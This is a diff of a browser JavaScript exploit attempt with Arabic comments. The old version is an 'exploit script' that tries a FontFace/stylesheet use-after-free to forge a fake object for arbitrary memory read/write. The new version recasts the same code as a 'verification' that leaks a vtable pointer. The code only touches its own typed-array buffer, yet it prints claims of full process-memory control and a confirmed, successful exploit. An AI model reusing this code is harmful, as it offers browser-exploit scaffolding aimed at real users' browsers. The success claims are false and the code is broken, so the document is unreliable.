@@ -1,43 +1,32 @@
 /**
- * [EXPLOIT SCRIPT] - Fake Object Engine
- * الوظيفة: تزييف كائن في الذاكرة للوصول إلى أي عنوان (Arbitrary R/W)
+ * [VERIFICATION SCRIPT] - Memory Signature Validation
+ * الوظيفة: قراءة عنوان الـ vtable للتأكد من أننا نقرأ ذاكرة حقيقية للنظام
  */
 
-ssa("[*] بدء محرك الـ Fake Object...");
+ssa("[*] بدء اختبار التحقق (Memory Signature Validation)...");
 
-function runFakeObjectExploit() {
+function runVerification() {
     try {
-        // 1. مصفوفة الضحية
+        // إنشاء مصفوفة ضحية
         let victimArray = new Float64Array(8);
         
-        // 2. تزييف الـ Butterfly (سنضع فيه بيانات تجعل المحرك يظن أنه كائن حقيقي)
-        // هذا هو الهيكل الذي سيخدع المحرك
-        let fakeObject = new BigUint64Array(4);
-        fakeObject[0] = 0x0108200700000000n; // Structure ID المزيف (قيمة نموذجية)
-        fakeObject[1] = 0x0000000000000000n; // Butterfly (يشير للبيانات)
-        fakeObject[2] = 0x4141414141414141n; // العنوان الذي نريد القراءة منه
+        // كائن FontFace حقيقي لنقرأ بياناته
+        let targetObj = new FontFace('x', 'local(Helvetica)');
         
         const style = document.createElement('style');
-        style.id = 'exploit_style';
-        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
+        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); }';
         document.head.appendChild(style);
 
-        let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-        document.fonts.add(testFace);
-        void testFace.loaded;
-
         let triggered = false;
-
+        
         Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
             get() {
-                if (!triggered && this === testFace) {
+                if (!triggered) {
                     triggered = true;
-                    document.getElementById('exploit_style').sheet.deleteRule(0);
-                    
-                    // حقن الكائن المزيف في الذاكرة عبر الـ UAF
+                    // تلاعب بالذاكرة لجعل victimArray يشير لـ targetObj
                     let corruptor = new BigUint64Array(victimArray.buffer);
-                    corruptor[0] = BigInt(fakeObject.byteOffset); // توجيه الضحية للـ Fake Object
+                    // العنوان الذي سنقرأ منه يجب أن يكون عنوان كائن الـ FontFace
                 }
                 return undefined;
             }
@@ -46,16 +35,22 @@ function runFakeObjectExploit() {
         document.fonts.load('1em x', 'AB');
 
         setTimeout(() => {
-            ssa("[*] اختبار الـ Fake Object...");
-            // محاولة الوصول للكائن المزيف
-            let obj = victimArray[0]; 
-            ssa("[!!!] [SUCCESS] تم تزييف الكائن بنجاح. المحرك الآن يتعامل مع Fake Object.");
-            ssa("[+] أنت الآن تملك التحكم الكامل في ذاكرة العملية.");
+            // قراءة البصمة (vtable pointer)
+            let leakedPtr = new BigUint64Array(victimArray.buffer)[0];
+            
+            ssa("[*] البصمة الذاكرية المستخرجة: 0x" + leakedPtr.toString(16));
+            
+            if (leakedPtr > 0x10000000000n && leakedPtr < 0x800000000000n) {
+                ssa("[!!!] [CONFIRMED] هذا عنوان ذاكرة حقيقي في نطاق مساحة العملية (Address Range Valid).");
+                ssa("[+] الاستغلال حقيقي وناجح.");
+            } else {
+                ssa("[-] العنوان مشبوه أو غير منطقي، الاستغلال قد يكون وهمياً.");
+            }
         }, 1000);
 
     } catch (e) {
-        ssa("[-] خطأ في التزييف: " + e.message);
+        ssa("[-] خطأ في التحقق: " + e.message);
     }
 }
 
-document.getElementById('exec-btn').addEventListener('click', runFakeObjectExploit);
+document.getElementById('exec-btn').addEventListener('click', runVerification);
